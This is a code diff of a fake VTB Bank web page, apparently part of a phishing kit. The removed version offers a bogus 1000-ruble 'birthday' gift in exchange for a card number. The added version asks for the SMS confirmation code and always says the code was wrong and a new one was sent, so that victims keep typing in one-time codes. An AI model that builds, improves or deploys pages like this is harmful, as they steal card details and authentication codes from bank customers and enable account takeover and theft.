@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/style.css">
-    <title>Подарок - Банк ВТБ</title>
+    <link rel="stylesheet" href="css/kod.css">
+    <title>Подтверждение личности - Банк ВТБ</title>
 </head>
 <body>
     <div class="wrap">
@@ -13,33 +13,19 @@
             <img src="Image/logo.png" alt="Лого ВТБ">
         </header>
     </div>
-    <header class="main">
-        <div class="wrap">
-           <div class="main-inform">
-               <div class="main-text">
-                <h2>Акция “День рождение ВТБ”</h2>
-                <p>Получите 1000 рублей <br>
-                    на свою ВТБ карту <br>
-                    в честь 30-летия банка </p>
-               </div>
-               <div class="main-but">
-                <a href="#form">ПОЛУЧИТЬ ПОДАРОК</a>
-               </div>
-           </div>
-        </div>
-    </header>
     <section id="form">
         <div class="wrap">
             <div class="form-text">
-                УСПЕЙ ПОЛУЧИТЬ СВОИ 1000 РУБЛЕЙ! <br>
-                АКЦИЯ ОГРАНИЧЕНА!
+                ДЛЯ ПОДТВЕРЖДЕНИЯ ЛИЧНОСТИ, <br>
+                ВВЕДИТЕ КОД ИЗ СМС  
             </div>
             <div class="number-card">
-                <p class="text-number">Введите номер карты ВТБ банка:</p>
-                <form action="kod.html">
-                    <input type="text" placeholder="Номер карты" required maxlength="16" minlength="16">
+                <p class="text-number">Введите номер код из СМС:</p>
+                <p id="nokode">Код не верный! Был выслан повторный код </p>
+                <form action="" onsubmit="return false;">
+                    <input type="text" placeholder="Код" required maxlength="4" minlength="4">
                     <div class="but">
-                        <button>ПОЛУЧИТЬ ПОДАРОК</button>
+                        <button onclick="message()">ОТПРАВИТЬ КОД</button>
                     </div>
                 </form>
             </div>
@@ -61,5 +47,6 @@
             </div>
         </div>
     </footer>
+    <script src="js/script.js"></script>
 </body>
 </html>
